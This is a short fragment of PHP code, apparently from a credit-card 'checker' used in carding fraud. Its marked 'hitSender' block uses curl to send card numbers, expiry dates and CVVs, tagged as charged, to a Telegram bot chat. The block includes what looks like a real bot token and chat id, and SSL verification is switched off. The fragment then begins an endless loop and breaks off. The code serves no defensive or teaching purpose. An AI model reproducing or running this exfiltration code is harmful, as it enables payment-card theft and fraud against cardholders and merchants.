...
#-------------------[hitSender REQ]--------------------#  
    ...
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot6282804958:AAEzpRX_9B3Ptkqptu4tzO-Ohgk3tZhDYTc/sendmessage?chat_id=-1001768382602&text=cc: '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'|%0ACharged: 5 $💸');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  $hitSender = curl_exec($ch);
                     echo $hitSender;
#------------------[2nd REQ]--------------------#  
$x = 0;  
while(true)  
